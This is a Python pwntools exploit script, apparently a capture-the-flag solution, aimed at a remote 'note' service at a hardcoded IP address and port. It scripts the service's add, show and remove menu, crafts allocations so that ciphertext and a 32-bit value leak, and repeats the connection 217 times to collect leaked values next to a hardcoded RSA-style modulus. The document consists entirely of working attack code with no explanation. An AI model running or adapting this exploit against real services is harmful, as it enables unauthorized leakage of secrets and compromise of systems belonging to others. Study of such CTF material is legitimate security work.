from pwn import *

#context.log_level='debug'

c = None
n=119862919784021876896632788732171629558372753329796248983162482350943775136215497413440491349328438203285008315965797006788581255798272729713090356495902786940229344372452610435794651328026846762979934035026369509129154750405685956170565957351882235642918037290866554605828892806451168914465041465450913867263
nh = n-1678779903L

def add(idx,enctype,size,cont):
    c.sendlineafter('exit\n','1')
    c.sendlineafter(':',str(idx))
    c.sendlineafter(':',str(enctype))
    c.sendlineafter(':',str(size))
    c.sendlineafter(':',cont)

def show(idx):
    c.sendlineafter('exit\n','2')
    c.sendlineafter(':',str(idx))

def remove(idx):
    c.sendlineafter('exit\n','3')
    c.sendlineafter(':',str(idx))

def once():
    global c
    #c = process('./note')
    c = remote('52.194.203.194', 21700)
    mypt = 'a'*0x40+'\x10'*0x10
    mypt = mypt.ljust(0x5f,'a')
    add(2, 1, 0x5f, mypt)
    show(2)
    myct = c.recvline().strip().decode('hex')
    last4 = u32(myct[:0x50][-4:])
    add(3, 1, 0x40, 'a'*0x40)
    add(4, 1, 0x14, 'a'*0x14)
    add(5, 1, 0x24, 'a'*0x24)
    add(6, 1, 0x34, 'a'*0x34)
    add(7, 1, 0x44, 'a'*0x44)
    add(8, 1, 0x54, 'a'*0x54)
    for i in range(9,20):
        add(i, 1, 16, 'a'*16)
    for i in range(6):
        show(4)
    for i in range(6):
        show(5)
    for i in range(4):
        show(6)
    for i in range(6):
        show(7)
    for i in range(2):
        show(8)
    
    #show(1)
    #for i in range(8):
    #    show(1)
    
    #pause()
    show(3)
    show(1)
    res = int(c.recvline(), 16)
    ncur = nh+last4
    c.close()
    return res, ncur

rr = []
nn = []
for i in range(217):
    print i
    res = once()
    rr.append(res[0])
    nn.append(res[1])

print 'go'
print nn
print rr
